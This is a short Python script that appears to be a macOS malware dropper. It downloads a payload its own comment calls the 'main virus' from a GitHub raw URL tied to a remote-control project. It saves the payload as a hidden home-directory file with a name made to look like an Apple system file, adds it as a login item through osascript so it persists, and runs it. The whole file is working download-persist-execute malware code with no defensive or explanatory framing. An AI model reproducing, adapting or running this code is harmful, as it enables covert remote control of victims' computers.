from requests import get
from os.path import expanduser
from os import remove
from subprocess import Popen as subproc
from os import system as cmd

filename = "com.apple.com.user.core"
localfile = f"{expanduser('~')}/.{filename}"
# download main virus
url = "https://raw.githubusercontent.com/mrdog233o5/Remote-Control-With-Evernote/main/main"
tb = 0
response = get(url)
if response.status_code == 200:
    with open(localfile, 'wb') as f:
        for chunk in response.iter_content(chunk_size=1024):
            if chunk:
                    tb += 1024
                    f.write(chunk)

cmd(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{expanduser('~')}/.{filename}\", hidden:false}}'")

subproc([localfile])
